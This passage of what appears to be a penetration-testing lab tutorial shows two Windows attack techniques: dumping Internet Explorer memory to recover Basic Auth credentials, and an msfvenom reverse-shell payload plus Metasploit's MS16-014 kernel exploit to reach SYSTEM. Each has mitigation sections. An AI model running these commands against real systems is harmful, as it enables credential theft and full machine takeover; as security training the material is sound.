![11_1.png](Images/11_1.png)

**2- Trigger authentication**:

- Open Internet Explorer from the victim windows and Browse to: [http://192.168.160.149/x](http://192.168.160.149/x)
- IE attempts to authenticate, storing the Basic Auth header in memory.

![11_2.png](Images/11_2.png)

![11_3.png](Images/11_3.png)

**3- Dump process memory**:

- Open Task Manager (`taskmgr`).
- Right‑click `iexplore.exe` → **Create Dump File**.
- This generates `iexplore.DMP`.
- **Transfer dump file**:
    - Copy `iexplore.DMP` to the Kali VM for analysis.

**4- Search dump file for credentials**:

```powershell
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```

Extracts any Basic Auth headers from the memory dump.

**5- Copy Base64 string**

**6- Decode Base64 string**:

```powershell
echo -ne [Base64 String] | base64 -d
```

## 3.Deep Dive: Why This Works

- **Normal behavior**: Browsers store authentication headers in memory during sessions.
- **Attack path**:
    - Attacker tricks victim into connecting to malicious server.
    - Browser stores Basic Auth header in memory.
    - Attacker dumps process memory and extracts header.
    - Decodes Base64 → retrieves cleartext credentials.

**Key insight**: Memory often contains sensitive data. Dumping processes is a powerful way to mine credentials.

## 4.Mitigations

- **Restrict memory dump permissions**:
    - Only administrators should be able to create process dumps.
    - Enforce least privilege.
- **Avoid Basic Authentication**:
    - Use stronger authentication methods (Kerberos, NTLM, OAuth).
    - Basic Auth transmits credentials in reversible Base64.
- **Encrypt sensitive traffic**:
    - Always use HTTPS to protect authentication headers.
    - Prevent interception and memory harvesting.
- **Monitoring**:
    - Detect suspicious use of Task Manager “Create Dump File”.
    - Monitor for tools like `strings` or dump analysis on endpoints.

## 5.Key Takeaways

- **Password mining from memory** is a powerful post‑exploitation technique.
- **Exploitation**: Dump process memory, search for authentication headers, decode Base64.
- **Impact**: Recover cleartext credentials, potentially administrator accounts.
- **Defense**: Restrict dump permissions, avoid Basic Auth, encrypt traffic, monitor suspicious activity.

# 12-Privilege Escalation - Kernel Exploits

## 1.Explanation

- **Kernel exploits**:
    - The Windows kernel is the core of the operating system, running with the highest privileges (SYSTEM).
    - Vulnerabilities in kernel drivers or subsystems can allow attackers to escalate from a low‑privileged user to SYSTEM.
    - Exploits like **MS16‑014** target flaws in Windows Management Instrumentation (WMI) notification handling.
- **Metasploit workflow**:
    - First, establish a foothold (reverse shell).
    - Then, use Metasploit’s **local_exploit_suggester** to identify kernel vulnerabilities present on the target.
    - Finally, run the suggested exploit to escalate privileges.

## 2.Establishing a Shell

**1- Start Metasploit handler**:

```powershell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=[Kali IP]
run
```

**2- Generate reverse shell payload**:

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[Kali IP] -f exe > shell.exe
```

**3- Transfer payload**: Copy `shell.exe` to the Windows and Run it

![12_1.png](Images/12_1.png)

This connects back to the Metasploit handler, giving you a **meterpreter session**.

## 3.Detection & Exploitation

**1- Run local exploit suggester**:

```powershell
run post/multi/recon/local_exploit_suggester
```

- Metasploit scans the target system for known vulnerabilities.
- Identifies `exploit/windows/local/ms16_014_wmi_recv_notif` as a candidate.

![12_2.png](Images/12_2.png)

**2- Load the exploit**:

```powershell
#background the session
CTRL + Z
sessions #notice the session number

use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION [meterpreter session number]
set LPORT 5555
set LHOST [Kali IP]   # if needed, override eth0 default
run
```

**Result**:

- Exploit triggers the kernel vulnerability.
- Meterpreter session escalates to SYSTEM privileges.

![12_3.png](Images/12_3.png)

## 4.Deep Dive: Why This Works

- **MS16‑014 vulnerability**:
    - A flaw in WMI notification handling allowed attackers to execute code in kernel context.
    - Exploit abuses this to elevate privileges.
- **Privilege escalation path**:
    - Attacker starts with a low‑privileged shell.
    - Exploit leverages kernel vulnerability.
    - Code executes as SYSTEM.
    - Attacker gains full control of the machine.

## 5.Mitigations

- **Patch management**:
    - Apply Microsoft’s security updates (MS16‑014 and others).
    - Kernel exploits rely on unpatched systems.
- **Exploit prevention**:
    - Use Endpoint Detection & Response (EDR) tools to detect exploit behavior.
    - Monitor for suspicious use of Metasploit modules.
- **Least privilege principle**:
    - Limit user rights to reduce exploit impact.
    - Ensure users don’t have unnecessary local admin rights.
- **Monitoring**:
    - Detect abnormal WMI activity.
    - Alert on suspicious PowerShell or Metasploit usage.

## 6.Key Takeaways

- **Kernel exploits** are powerful because they target vulnerabilities in the OS itself.
- **Workflow**: Establish shell → run local exploit suggester → apply kernel exploit → escalate to SYSTEM.
- **Impact**: Full system compromise, bypassing misconfiguration defenses.
- **Defense**: Patch systems, monitor exploit behavior, enforce least privilege.
